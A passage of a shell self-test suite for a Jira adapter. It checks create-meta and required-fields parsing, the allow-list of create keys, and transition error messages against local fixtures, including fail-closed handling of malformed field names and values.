  if [ "$cm_rc" -eq 0 ] && [ "$cm_reqs" -eq 4 ] && [ "$cm_types" = "Epic Story Task " ] \
     && printf '%s\n' "$cm_out" | grep -qF "Epic${cm_tab}customfield_10049${cm_tab}option${cm_tab}Size${cm_tab}XS|S|M|L|XL"; then
    echo "PASS: selftest — create-meta/all-types: every non-subtask type is covered (Epic 10049, Task, Story); Subtask is skipped (4 GETs)"
  else
    echo "FAIL: selftest — create-meta/all-types (rc=$cm_rc reqs=$cm_reqs types='$cm_types')"; sfail=1
  fi

  # --- create-meta/type-absent: a type the project doesn't have -> rc 1, empty stdout, the fixed sentence ---
  : > "$argvlog"; _tj_fxseq cm-types
  cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB Bug 2>"$tmpd/cm.err") || cm_rc=$?
  cm_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$cm_rc" -eq 3 ] && [ -z "$cm_out" ] && [ "$cm_reqs" -eq 1 ] \
     && [ "$(cat "$tmpd/cm.err")" = "refused: the issue type is not in this project's create-meta" ]; then
    echo "PASS: selftest — create-meta/type-absent: a type the project lacks is the DEDICATED rc 3, empty stdout, fixed sentence (1 GET)"
  else
    echo "FAIL: selftest — create-meta/type-absent (rc=$cm_rc reqs=$cm_reqs out='$cm_out' err='$(cat "$tmpd/cm.err")')"; sfail=1
  fi

  # --- create-meta/no-credential: a credential refusal from the primitive is rc 2 (unverified), NEVER the
  # type-absent rc 3, and its own sentence reaches stderr; zero requests were made.
  : > "$argvlog"; _tj_fxseq cm-types
  cm_rc=0; cm_err=$( ( unset KIT_TRACKER_USER KIT_TRACKER_TOKEN JIRA_EMAIL JIRA_TOKEN; tj_create_meta "$cm_url" cloud AB Task 2>&1 >/dev/null ) ) || cm_rc=$?
  if [ "$cm_rc" -eq 2 ] && [ ! -s "$argvlog" ] && printf '%s' "$cm_err" | grep -q 'credential'; then
    echo "PASS: selftest — create-meta/no-credential: no credential -> rc 2 (not 3), the credential sentence, zero requests"
  else
    echo "FAIL: selftest — create-meta/no-credential (rc=$cm_rc err='$cm_err')"; sfail=1
  fi

  # --- create-meta/ambiguous: two non-subtask types with one name -> rc 4, the fixed sentence, one GET, no POST
  jq -c '.issueTypes += [{"id":"10009","name":"Task","subtask":false}]' "$fixdir/cloud-createmeta-types.json" > "$tmpd/.cm-body"
  : > "$argvlog"; : > "$tmpd/.methods"; _tj_fxseq cm-tmp
  cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB Task 2>"$tmpd/cm.err") || cm_rc=$?
  cm_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$cm_rc" -eq 4 ] && [ -z "$cm_out" ] && [ "$cm_reqs" -eq 1 ] && ! grep -q POST "$tmpd/.methods" \
     && [ "$(cat "$tmpd/cm.err")" = "refused: the issue type name is ambiguous in this project (more than one type carries it)" ]; then
    echo "PASS: selftest — create-meta/ambiguous: two types named Task are refused rc 4 with the fixed sentence, one GET, zero POSTs"
  else
    echo "FAIL: selftest — create-meta/ambiguous (rc=$cm_rc reqs=$cm_reqs out='$cm_out' err='$(cat "$tmpd/cm.err")')"; sfail=1
  fi

  # --- create-meta/dc: Data Center's `values` key (not issueTypes/fields) parses; REST v2 URLs ---
  : > "$argvlog"; _tj_fxseq cm-dc-types cm-dc-task
  cm_rc=0; cm_out=$(tj_create_meta "$cm_url" datacenter AB Task 2>/dev/null) || cm_rc=$?
  cm_lasturl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  cm_dclines=$(printf '#type-id\t10000\nTask\tcustomfield_10200\toption\tSize\tS|M\nTask\tdescription\tstring\tDescription\t\nTask\tlabels\tarray\tLabels\t\nTask\tcustomfield_10100\tany\tEpic Link\t')
  if [ "$cm_rc" -eq 0 ] && [ "$cm_lasturl" = "$cm_url/rest/api/2/issue/createmeta/AB/issuetypes/10000?maxResults=100" ] \
     && [ "$cm_out" = "$cm_dclines" ]; then
    echo "PASS: selftest — create-meta/dc: a Data Center 'values'-shaped create-meta parses (REST v2, Epic Link shown, no parent)"
  else
    echo "FAIL: selftest — create-meta/dc (rc=$cm_rc url='$cm_lasturl' out='$cm_out')"; sfail=1
  fi

  # --- create-meta/hostile (type list): a type NAME with a pipe, or a type ID that is not digits, is
  # fail-closed — rc 2, empty stdout, the ONE fixed charset sentence, never the bytes.
  cm_hostile_sentence="unverified: create-meta response carried a value outside the allowed charset"
  cm_hn=0
  for cm_mut in '.issueTypes[2].name = "Ta|sk"' '.issueTypes[2].id = "1000\n3"'; do
    cm_hn=$((cm_hn + 1))
    jq -c "$cm_mut" "$fixdir/cloud-createmeta-types.json" > "$tmpd/.cm-body"
    : > "$argvlog"; _tj_fxseq cm-tmp
    cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB Task 2>"$tmpd/cm.err") || cm_rc=$?
    if [ "$cm_rc" -eq 2 ] && [ -z "$cm_out" ] && [ "$(cat "$tmpd/cm.err")" = "$cm_hostile_sentence" ]; then
      echo "PASS: selftest — create-meta/hostile/$cm_hn: a pipe in a type name / a non-digit type id gets the fixed sentence, rc 2, nothing printed"
    else
      echo "FAIL: selftest — create-meta/hostile/$cm_hn (rc=$cm_rc out='$cm_out' err='$(cat "$tmpd/cm.err")')"; sfail=1
    fi
  done

  # --- create-meta/project (fields): ONE odd field must not block every create. A non-conforming field
  # NAME or schema type is projected as `?`; a non-conforming or over-long allowed value is DROPPED and the
  # rest kept; the call still succeeds (rc 0). Each mutation names the exact line it must produce.
  cm_pn=0
  for cm_case in '.fields[1].name = "Si|ze"@Task	customfield_10046	option	?	XS|S|M|L|XL' \
                 '.fields[1].allowedValues[0].value = "X\tS"@Size	S|M|L|XL' \
                 '.fields[2].schema.type = "opt\u0007ion"@Task	customfield_10047	?	Risk	Low|Medium|High' \
                 '.fields[1].allowedValues[1].value = ("S" * 90)@Size	XS|M|L|XL' \
                 '.fields[0].name = "Größe"@Task	customfield_10016	number	?	' \
                 '.fields[1].allowedValues[1].value = "Ü"@Size	XS|M|L|XL'; do
    cm_pn=$((cm_pn + 1)); cm_mut=${cm_case%%@*}; cm_want=${cm_case#*@}
    jq -c "$cm_mut" "$fixdir/cloud-createmeta-task.json" > "$tmpd/.cm-body"
    : > "$argvlog"; _tj_fxseq cm-types cm-tmp
    cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB Task 2>/dev/null) || cm_rc=$?
    if [ "$cm_rc" -eq 0 ] && printf '%s\n' "$cm_out" | grep -qF "$cm_want"; then
      echo "PASS: selftest — create-meta/project/$cm_pn: a non-conforming name/type is '?', a non-conforming value is dropped, create-meta still succeeds"
    else
      echo "FAIL: selftest — create-meta/project/$cm_pn (rc=$cm_rc want='$cm_want' out='$cm_out')"; sfail=1
    fi
  done
  # a response whose fields are not an array stays fail-closed (shape), with its own sentence
  jq -c '.fields = "x"' "$fixdir/cloud-createmeta-task.json" > "$tmpd/.cm-body"
  : > "$argvlog"; _tj_fxseq cm-types cm-tmp
  cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB Task 2>"$tmpd/cm.err") || cm_rc=$?
  if [ "$cm_rc" -eq 2 ] && [ -z "$cm_out" ] && [ "$(cat "$tmpd/cm.err")" = "unverified: create-meta response failed the expected shape" ]; then
    echo "PASS: selftest — create-meta/shape: a fields value that is not an array is unverified (fail-closed), rc 2"
  else
    echo "FAIL: selftest — create-meta/shape (rc=$cm_rc out='$cm_out' err='$(cat "$tmpd/cm.err")')"; sfail=1
  fi

  # --- create-meta/short-page: the page reports more fields than it returned -> unverified, never truncated ---
  jq -c '.total = 30' "$fixdir/cloud-createmeta-task.json" > "$tmpd/.cm-body"
  : > "$argvlog"; _tj_fxseq cm-types cm-tmp
  cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB Task 2>"$tmpd/cm.err") || cm_rc=$?
  if [ "$cm_rc" -eq 2 ] && [ -z "$cm_out" ] \
     && [ "$(cat "$tmpd/cm.err")" = "unverified: create-meta page is incomplete (it reports more fields than it returned)" ]; then
    echo "PASS: selftest — create-meta/short-page: a page reporting more fields than it returned is unverified, never silently truncated"
  else
    echo "FAIL: selftest — create-meta/short-page (rc=$cm_rc out='$cm_out' err='$(cat "$tmpd/cm.err")')"; sfail=1
  fi

  # --- create-meta/arg-grammar: a lowercase project or a quote in the type refuses before any request ---
  : > "$argvlog"
  cm_rc1=0; tj_create_meta "$cm_url" cloud ab Task >/dev/null 2>&1 || cm_rc1=$?
  cm_rc2=0; tj_create_meta "$cm_url" cloud AB 'Ta"sk' >/dev/null 2>&1 || cm_rc2=$?
  if [ "$cm_rc1" -eq 1 ] && [ "$cm_rc2" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — create-meta/arg-grammar: a bad project or a quote-bearing type refuses rc 1 with zero requests"
  else
    echo "FAIL: selftest — create-meta/arg-grammar (rc1=$cm_rc1 rc2=$cm_rc2 dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
}

# _tj_rfmut <jq-filter>: run required-fields (Task, cloud) against the required-fields fixture after
# a jq mutation; leaves rf_rc / rf_out / rf_err for the leg to judge.
_tj_rfmut() {
  jq -c "$1" "$fixdir/cloud-createmeta-task-required.json" > "$tmpd/.cm-body"
  : > "$argvlog"; _tj_fxseq cm-types cm-tmp
  rf_rc=0; rf_out=$(tj_required_fields "$cm_url" cloud AB Task 2>"$tmpd/rf.err") || rf_rc=$?
  rf_err=$(cat "$tmpd/rf.err")
}

# _tj_st_required: TRACKER-REQUIRED-FIELDS-DISCOVERY — the required-fields op (design §3, §15b).
_tj_st_required() {
  cm_url="https://ex.atlassian.net"
  rf_tab=$(printf '\t')
  rf_want=$(printf '#type-id\t10003\ncustomfield_10001\tteam\tTeam\t\tcomplete\ncustomfield_10050\toption\tDelivery Area\tAlpha|Beta\tcomplete\ncustomfield_10051\tstring\tCost Centre\t\tcomplete\ncustomfield_10052\ttext\tRationale\t\tcomplete\ncustomfield_10054\tuser\tApprover\t\tcomplete\ncustomfield_10055\tunsupported\tStart At\t\tcomplete\ncomponents\tcomponent-array\tComponents\tApi|Web\tcomplete')

  # --- required-fields/cloud: exact stdout; GET-only; the type's numeric id in the URL ---
  : > "$argvlog"; : > "$tmpd/.methods"; _tj_fxseq cm-types cm-req-task
  rf_rc=0; rf_out=$(tj_required_fields "$cm_url" cloud AB Task 2>/dev/null) || rf_rc=$?
  rf_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  rf_lasturl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  if [ "$rf_rc" -eq 0 ] && [ "$rf_out" = "$rf_want" ] && [ "$rf_reqs" -eq 2 ] && ! grep -qv '^GET$' "$tmpd/.methods" \
     && [ "$rf_lasturl" = "$cm_url/rest/api/3/issue/createmeta/AB/issuetypes/10003?maxResults=100" ]; then
    echo "PASS: selftest — required-fields/cloud: team, option(+allowed), string, text, user, unsupported, component-array print in the closed grammar (2 GETs)"
  else
    echo "FAIL: selftest — required-fields/cloud (rc=$rf_rc reqs=$rf_reqs url='$rf_lasturl' out='$rf_out')"; sfail=1
  fi
  # the load-bearing negatives: a defaulted field, reporter, project/issuetype/summary and a non-required field never print
  if printf '%s\n' "$rf_out" | grep -q -e customfield_10053 -e '^reporter' -e '^project' -e '^issuetype' -e '^summary' -e customfield_10046 -e '^priority'; then
    echo "FAIL: selftest — required-fields/excluded: a defaulted, server-filled or optional field was emitted (out='$rf_out')"; sfail=1
  else
    echo "PASS: selftest — required-fields/excluded: hasDefaultValue:true, reporter, project/issuetype/summary and non-required fields are never emitted"
  fi

  # --- required-fields/shape: .required must be a JSON boolean; "true" (a string) is unverified, rc 2 ---
  _tj_rfmut '.fields[0].required = "true"'
  if [ "$rf_rc" -eq 2 ] && [ -z "$rf_out" ] && [ "$rf_err" = "unverified: create-meta response failed the expected shape" ]; then
    echo "PASS: selftest — required-fields/shape: a string \"true\" for .required is unverified rc 2 (shape-strict), nothing printed"
  else
    echo "FAIL: selftest — required-fields/shape (rc=$rf_rc out='$rf_out' err='$rf_err')"; sfail=1
  fi

  # --- required-fields/default-absent: a missing hasDefaultValue key (and a non-boolean one) is NO default -> emitted ---
  _tj_rfmut 'del(.fields[4].hasDefaultValue)'
  rf_ok1=0; [ "$rf_rc" -eq 0 ] && printf '%s\n' "$rf_out" | grep -qF "customfield_10053${rf_tab}string${rf_tab}Defaulted Note${rf_tab}${rf_tab}complete" && rf_ok1=1
  _tj_rfmut '.fields[4].hasDefaultValue = "true"'
  rf_ok2=0; [ "$rf_rc" -eq 0 ] && printf '%s\n' "$rf_out" | grep -qF "customfield_10053${rf_tab}string${rf_tab}Defaulted Note${rf_tab}${rf_tab}complete" && rf_ok2=1
  if [ "$rf_ok1" -eq 1 ] && [ "$rf_ok2" -eq 1 ]; then
    echo "PASS: selftest — required-fields/default-absent: an absent (or non-boolean) hasDefaultValue counts as no default, so the field is emitted"
  else
    echo "FAIL: selftest — required-fields/default-absent (absent=$rf_ok1 string=$rf_ok2 out='$rf_out')"; sfail=1
  fi

  # --- required-fields/allowed-sok: a pipe / non-ASCII allowed value is dropped, the rest kept, completeness truncated ---
  rf_sn=0
  for rf_mut in '.fields[1].allowedValues[0].value = "Al|pha"' '.fields[1].allowedValues[0].value = "Ünï"' '.fields[1].allowedValues[0].value = ("A" * 90)'; do
    rf_sn=$((rf_sn + 1))
    _tj_rfmut "$rf_mut"
    if [ "$rf_rc" -eq 0 ] && printf '%s\n' "$rf_out" | grep -qF "customfield_10050${rf_tab}option${rf_tab}Delivery Area${rf_tab}Beta${rf_tab}truncated" \
       && printf '%s\n' "$rf_out" | grep -qF "customfield_10051${rf_tab}string${rf_tab}Cost Centre${rf_tab}${rf_tab}complete"; then
      echo "PASS: selftest — required-fields/allowed-sok/$rf_sn: a non-sok allowed value is dropped and ONLY that field is truncated"
    else
      echo "FAIL: selftest — required-fields/allowed-sok/$rf_sn (rc=$rf_rc out='$rf_out')"; sfail=1
    fi
  done
  # more than 100 allowed values: the first 100 print (99 joiners), completeness truncated
  _tj_rfmut '.fields[1].allowedValues = [range(101) | {value: ("v" + tostring)}]'
  rf_line=$(printf '%s\n' "$rf_out" | grep -F "customfield_10050${rf_tab}" || true)
  rf_pipes=$(printf '%s' "$rf_line" | tr -cd '|' | wc -c | tr -d ' ')
  if [ "$rf_rc" -eq 0 ] && [ "$rf_pipes" -eq 99 ] && printf '%s' "$rf_line" | grep -q "${rf_tab}truncated\$"; then
    echo "PASS: selftest — required-fields/over-100: a 101-value allowed list prints 100 and is marked truncated"
  else
    echo "FAIL: selftest — required-fields/over-100 (rc=$rf_rc pipes=$rf_pipes)"; sfail=1
  fi

  # --- required-fields/bad-fieldid: a malformed fieldId is dropped (never printed); the result is truncated ---
  rf_bn=0
  for rf_mut in '.fields[2].fieldId = "customfield_10051;x"' '.fields[2].fieldId = "customfield_10051\n"' '.fields[2].fieldId = "Customfield_1"' '.fields[2].fieldId = 7'; do
    rf_bn=$((rf_bn + 1))
    _tj_rfmut "$rf_mut"
    if [ "$rf_rc" -eq 0 ] && ! printf '%s\n' "$rf_out" | grep -q -e 'Cost Centre' -e '10051' -e 'Customfield_1' \
       && [ "$(printf '%s\n' "$rf_out" | sed -n '2p')" = "#dropped${rf_tab}1" ] \
       && printf '%s\n' "$rf_out" | grep -qF "customfield_10052${rf_tab}text${rf_tab}Rationale${rf_tab}${rf_tab}truncated"; then
      echo "PASS: selftest — required-fields/bad-fieldid/$rf_bn: a malformed fieldId is dropped, never printed, counted on the #dropped sentinel line (R3), and the result is marked truncated"
    else
      echo "FAIL: selftest — required-fields/bad-fieldid/$rf_bn (rc=$rf_rc out='$rf_out')"; sfail=1
    fi
  done

  # --- required-fields/type-absent (rc 3) and ambiguous (rc 4): the create-meta fetch's own contract ---
  : > "$argvlog"; _tj_fxseq cm-types
  rf_rc=0; rf_out=$(tj_required_fields "$cm_url" cloud AB Bug 2>/dev/null) || rf_rc=$?
  jq -c '.issueTypes += [{"id":"10009","name":"Task","subtask":false}]' "$fixdir/cloud-createmeta-types.json" > "$tmpd/.cm-body"
  : > "$argvlog"; _tj_fxseq cm-tmp
  rf_rc2=0; rf_out2=$(tj_required_fields "$cm_url" cloud AB Task 2>/dev/null) || rf_rc2=$?
  if [ "$rf_rc" -eq 3 ] && [ -z "$rf_out" ] && [ "$rf_rc2" -eq 4 ] && [ -z "$rf_out2" ]; then
    echo "PASS: selftest — required-fields/type: an absent type is rc 3, an ambiguous one rc 4, both with nothing printed"
  else
    echo "FAIL: selftest — required-fields/type (absent rc=$rf_rc ambiguous rc=$rf_rc2 out='$rf_out$rf_out2')"; sfail=1
  fi

  # --- required-fields/dc: Data Center's `values` envelope, REST v2; reporter excluded even with no default ---
  rf_dcwant=$(printf '#type-id\t10000\ncustomfield_10200\toption\tSize\tS|M\tcomplete\ncustomfield_10201\tuser\tApprover\t\tcomplete')
  : > "$argvlog"; _tj_fxseq cm-dc-types cm-req-dc-task
  rf_rc=0; rf_out=$(tj_required_fields "$cm_url" datacenter AB Task 2>/dev/null) || rf_rc=$?
  rf_lasturl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  if [ "$rf_rc" -eq 0 ] && [ "$rf_out" = "$rf_dcwant" ] && [ "$rf_lasturl" = "$cm_url/rest/api/2/issue/createmeta/AB/issuetypes/10000?maxResults=100" ]; then
    echo "PASS: selftest — required-fields/dc: a Data Center 'values' meta parses (REST v2); a no-default reporter and summary are excluded"
  else
    echo "FAIL: selftest — required-fields/dc (rc=$rf_rc url='$rf_lasturl' out='$rf_out')"; sfail=1
  fi

  # --- required-fields/short-page and arg-grammar: unverified on a short page; bad args refuse before any request ---
  _tj_rfmut '.total = 30'
  rf_ok1=0; [ "$rf_rc" -eq 2 ] && [ -z "$rf_out" ] && [ "$rf_err" = "unverified: create-meta page is incomplete (it reports more fields than it returned)" ] && rf_ok1=1
  : > "$argvlog"
  rf_rc1=0; tj_required_fields "$cm_url" cloud AB >/dev/null 2>&1 || rf_rc1=$?
  rf_rc2=0; tj_required_fields "$cm_url" cloud ab Task >/dev/null 2>&1 || rf_rc2=$?
  rf_rc3=0; tj_required_fields "$cm_url" cloud AB 'Ta"sk' >/dev/null 2>&1 || rf_rc3=$?
  if [ "$rf_ok1" -eq 1 ] && [ "$rf_rc1" -eq 1 ] && [ "$rf_rc2" -eq 1 ] && [ "$rf_rc3" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — required-fields/args: a short page is unverified; a missing type, bad project or quote-bearing type refuse rc 1 with zero requests"
  else
    echo "FAIL: selftest — required-fields/args (short=$rf_ok1 rc=$rf_rc1/$rf_rc2/$rf_rc3 dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
}

# _tj_st_writable_keys: the ONE closed set of create fragment keys — printed by `writable-create-keys` AND
# enforced by tj_create's allow-list (design §15c). The two must never drift.
_tj_st_writable_keys() {
  cm_url="https://ex.atlassian.net"
  wk_want=$(printf 'customfield_N\npriority\ncomponents\nfixVersions\nduedate\nlabels\nparent\ndescription')
  : > "$argvlog"
  wk_rc=0; wk_out=$(tj_writable_create_keys 2>/dev/null) || wk_rc=$?
  wk_cli=$(sh "$0" writable-create-keys 2>/dev/null || true)
  if [ "$wk_rc" -eq 0 ] && [ "$wk_out" = "$wk_want" ] && [ "$wk_cli" = "$wk_want" ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — writable-create-keys: exactly the eight keys, in order, via the CLI too, with no request made"
  else
    echo "FAIL: selftest — writable-create-keys (rc=$wk_rc out='$wk_out' cli='$wk_cli')"; sfail=1
  fi
  # every printed key is ADMITTED by tj_create (customfield_N stands for customfield_10046) — one definition, two uses
  wk_bad=0
  _tj_fx create-good
  for wk_k in $(printf '%s\n' "$wk_want" | sed 's/customfield_N/customfield_10046/'); do
    : > "$tmpd/.methods"
    wk_rc=0; tj_create "$cm_url" cloud AB "t" Task "$(jq -n --arg k "$wk_k" 'if $k == "priority" then {($k): {name: "x"}} elif $k == "components" or $k == "fixVersions" then {($k): [{name: "x"}]} elif $k == "duedate" then {($k): "2026-10-03"} else {($k): "x"} end')" >/dev/null 2>&1 || wk_rc=$?
    [ "$wk_rc" -eq 0 ] && [ "$(cat "$tmpd/.methods")" = "POST" ] || wk_bad="$wk_bad $wk_k"
  done
  # ... and the newly widened ones carry their real shapes into the POST body
  wk_rc=0; tj_create "$cm_url" cloud AB "t" Task '{"priority":{"name":"High"},"components":[{"name":"Api"}]}' >/dev/null 2>&1 || wk_rc=$?
  wk_body=$(jq -c '.fields | [.priority.name, .components[0].name]' "$tmpd/.lastbody" 2>/dev/null || true)
  if [ "$wk_bad" = 0 ] && [ "$wk_rc" -eq 0 ] && [ "$wk_body" = '["High","Api"]' ]; then
    echo "PASS: selftest — create/widened-keys: every writable-create-keys key is admitted by tj_create; priority and components reach the POST body"
  else
    echo "FAIL: selftest — create/widened-keys (not admitted:'$wk_bad' rc=$wk_rc body='$wk_body')"; sfail=1
  fi
  # the load-bearing negative: keys OUTSIDE the set are still refused rc 1 BEFORE any request
  : > "$argvlog"
  wk_bad=0
  for wk_k in assignee reporter environment fixversions Priority customfield_x security; do
    wk_rc=0; tj_create "$cm_url" cloud AB "t" Task "$(jq -n --arg k "$wk_k" '{($k): "x"}')" >/dev/null 2>"$tmpd/wk.err" || wk_rc=$?
    [ "$wk_rc" -eq 1 ] && [ "$(cat "$tmpd/wk.err")" = "refused: the create fields fragment carries a key outside the allowed set" ] || wk_bad="$wk_bad $wk_k"
  done
  if [ "$wk_bad" = 0 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — create/widened-keys-negative: assignee, reporter, security and look-alike keys are still refused rc 1 with zero requests"
  else
    echo "FAIL: selftest — create/widened-keys-negative (admitted:'$wk_bad' dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  # L2: the system keys' VALUE shapes are checked adapter-side too — a malformed one is refused before any request
  # with a fixed sentence; the well-formed shapes are still created
  : > "$argvlog"
  wk_bad=0; wk_shape="refused: the create fields fragment carries a malformed value for priority, components, fixVersions or duedate"
  for wk_f in '{"priority":"High"}' '{"priority":{"name":"High","extra":1}}' '{"priority":{"name":5}}' '{"priority":{}}' \
              '{"components":{"name":"Api"}}' '{"components":["Api"]}' '{"fixVersions":[{"name":"v1","x":"y"}]}' \
              '{"duedate":"tomorrow"}' '{"duedate":5}' '{"duedate":"2026-10-03\n"}'; do
    wk_rc=0; tj_create "$cm_url" cloud AB "t" Task "$wk_f" >/dev/null 2>"$tmpd/wk.err" || wk_rc=$?
    [ "$wk_rc" -eq 1 ] && [ "$(cat "$tmpd/wk.err")" = "$wk_shape" ] || wk_bad="$wk_bad $wk_f"
  done
  wk_none=0; [ ! -s "$argvlog" ] && wk_none=1
  : > "$tmpd/.methods"; _tj_fx create-good
  wk_ok=0
  tj_create "$cm_url" cloud AB "t" Task '{"priority":{"id":"3"},"components":[{"id":"7"},{"name":"Api"}],"fixVersions":[],"duedate":"2026-10-03"}' >/dev/null 2>&1 && wk_ok=1
  if [ "$wk_bad" = 0 ] && [ "$wk_none" -eq 1 ] && [ "$wk_ok" -eq 1 ] && [ "$(cat "$tmpd/.methods")" = "POST" ]; then
    echo "PASS: selftest — create/value-shapes: a malformed priority, components, fixVersions or duedate is refused rc 1 with zero requests; the well-formed shapes are created (L2)"
  else
    echo "FAIL: selftest — create/value-shapes (admitted:'$wk_bad' dispatched=$([ -s "$argvlog" ] && echo yes || echo no) ok=$wk_ok)"; sfail=1
  fi
}

# _tj_st_transition_fields: TRACKER-REQUIRED-FIELDS-DISCOVERY §15a — the POST is always attempted; a 400
# is diagnosed (rc 5) with the screen's required fields, never Jira's body (S-6).
_tj_st_transition_fields() {
  tf_url="https://ex.atlassian.net"
  tf_tail="a workflow validator may also require a field the screen does not report - the kit does not fill transition screens: set it in Jira, or give it a default in the workflow"
  # --- the GET asks for the screen fields; a 400 on the POST names the required ones; exactly one POST ---
  : > "$argvlog"; : > "$tmpd/.methods"; : > "$tmpd/.urls"; _tj_fx move-fields-400
  tf_rc=0; tf_out=$(tj_transition "$tf_url" cloud AB AB-7 "Done" 2>"$tmpd/tf.err") || tf_rc=$?
  tf_err=$(cat "$tmpd/tf.err")
  tf_want="refused: jira refused the transition to 'Done'; its screen requires: resolution (Resolution); $tf_tail"
  if [ "$tf_rc" -eq 5 ] && [ -z "$tf_out" ] && [ "$tf_err" = "$tf_want" ] \
     && [ "$(grep -c '^POST$' "$tmpd/.methods")" -eq 1 ] \
     && [ "$(sed -n '1p' "$tmpd/.urls")" = "$tf_url/rest/api/3/issue/AB-7/transitions?expand=transitions.fields" ]; then
    echo "PASS: selftest — transition/400-required: GET carries expand=transitions.fields; the 400 is rc 5 naming resolution (Resolution); one POST"
  else
    echo "FAIL: selftest — transition/400-required (rc=$tf_rc posts=$(grep -c '^POST$' "$tmpd/.methods") url='$(sed -n '1p' "$tmpd/.urls")' err='$tf_err')"; sfail=1
  fi
  # the defaulted screen field (customfield_10060) and the optional comment are NOT named
  if printf '%s' "$tf_err" | grep -q -e customfield_10060 -e Comment -e TJ-400-BODY-MARKER; then
    echo "FAIL: selftest — transition/400-negatives: a defaulted/optional field or the Jira body reached the sentence (err='$tf_err')"; sfail=1
  else
    echo "PASS: selftest — transition/400-negatives: a defaulted field, an optional field and Jira's response body never reach the sentence (S-6)"
  fi

  # --- a 400 with NO required screen field: rc 5, the honest 'reports no required field' clause ---
  : > "$tmpd/.methods"; _tj_fx move-fields-400
  tf_rc=0; tf_out=$(tj_transition "$tf_url" cloud AB AB-7 "In Progress" 2>"$tmpd/tf.err") || tf_rc=$?
  tf_err=$(cat "$tmpd/tf.err")
  tf_want="refused: jira refused the transition to 'In Progress'; its screen reports no required field; $tf_tail"
  if [ "$tf_rc" -eq 5 ] && [ -z "$tf_out" ] && [ "$tf_err" = "$tf_want" ] && [ "$(grep -c '^POST$' "$tmpd/.methods")" -eq 1 ]; then
    echo "PASS: selftest — transition/400-none: a 400 on a screen with no required field is rc 5 with the 'reports no required field' clause"
  else
    echo "FAIL: selftest — transition/400-none (rc=$tf_rc err='$tf_err')"; sfail=1
  fi

  # --- R4: a transition's .fields that is present but NOT an object is "could not be read", never "no required field" ---
  jq -c '.transitions |= map(if .to.name == "In Progress" then .fields = "oops" else . end)' "$fixdir/transitions-with-fields.json" > "$tmpd/.cm-body"
  : > "$tmpd/.methods"; _tj_fx move-fields-400-tmp
  tf_rc=0; tj_transition "$tf_url" cloud AB AB-7 "In Progress" >/dev/null 2>"$tmpd/tf.err" || tf_rc=$?
  tf_err=$(cat "$tmpd/tf.err")
  tf_want="refused: jira refused the transition to 'In Progress'; its screen fields could not be read; $tf_tail"
  if [ "$tf_rc" -eq 5 ] && [ "$tf_err" = "$tf_want" ]; then
    echo "PASS: selftest — transition/400-unreadable: a non-object .fields says 'its screen fields could not be read', not 'reports no required field' (R4)"
  else
    echo "FAIL: selftest — transition/400-unreadable (rc=$tf_rc err='$tf_err')"; sfail=1
  fi

  # --- a hostile screen name / id is sok-gated: never printed raw ---
  jq -c '.transitions[1].fields.resolution.name = "Re|so" | .transitions[1].fields["bad id;x"] = {"required":true,"name":"Why","schema":{"type":"string"}}' \
    "$fixdir/transitions-with-fields.json" > "$tmpd/.cm-body"
  : > "$tmpd/.methods"; _tj_fx move-fields-400-tmp
  tf_rc=0; tj_transition "$tf_url" cloud AB AB-7 "Done" >/dev/null 2>"$tmpd/tf.err" || tf_rc=$?
  tf_err=$(cat "$tmpd/tf.err")
  if [ "$tf_rc" -eq 5 ] && printf '%s' "$tf_err" | grep -qF "resolution (?)" && printf '%s' "$tf_err" | grep -qF "? (Why)" \
     && ! printf '%s' "$tf_err" | grep -q -e 'bad id' -e 'Re|so'; then
    echo "PASS: selftest — transition/400-hostile: a non-sok screen field name or id prints as '?', never raw"
  else
    echo "FAIL: selftest — transition/400-hostile (rc=$tf_rc err='$tf_err')"; sfail=1
  fi

  # --- success is unchanged: the POST goes through, rc 0, nothing on stderr, still one POST ---
  : > "$tmpd/.methods"; _tj_fx move-fields-ok
  tf_rc=0; tf_out=$(tj_transition "$tf_url" cloud AB AB-7 "Done" 2>"$tmpd/tf.err") || tf_rc=$?
  if [ "$tf_rc" -eq 0 ] && [ ! -s "$tmpd/tf.err" ] && [ "$(grep -c '^POST$' "$tmpd/.methods")" -eq 1 ]; then
    echo "PASS: selftest — transition/ok: a screen with a required field does not pre-empt the POST; a 2xx POST is rc 0"
  else
    echo "FAIL: selftest — transition/ok (rc=$tf_rc err='$(cat "$tmpd/tf.err")')"; sfail=1
  fi

  # --- every OTHER failure keeps today's rc and sentence: a POST 404 stays rc 2 'unverified'; a 400 on the
  # GET (not the POST) is never mistaken for a refused transition ---
  : > "$tmpd/.methods"; _tj_fx move-fields-404
  tf_rc=0; tj_transition "$tf_url" cloud AB AB-7 "Done" >/dev/null 2>"$tmpd/tf.err" || tf_rc=$?
  tf_ok1=0; [ "$tf_rc" -eq 2 ] && [ "$(cat "$tmpd/tf.err")" = "unverified: jira returned status 404" ] && tf_ok1=1
  : > "$tmpd/.methods"; _tj_fx bad-request
  tf_rc=0; tj_transition "$tf_url" cloud AB AB-7 "Done" >/dev/null 2>"$tmpd/tf.err" || tf_rc=$?
  tf_ok2=0; [ "$tf_rc" -eq 2 ] && [ "$(cat "$tmpd/tf.err")" = "unverified: jira returned status 400" ] && ! grep -q POST "$tmpd/.methods" && tf_ok2=1
  if [ "$tf_ok1" -eq 1 ] && [ "$tf_ok2" -eq 1 ]; then
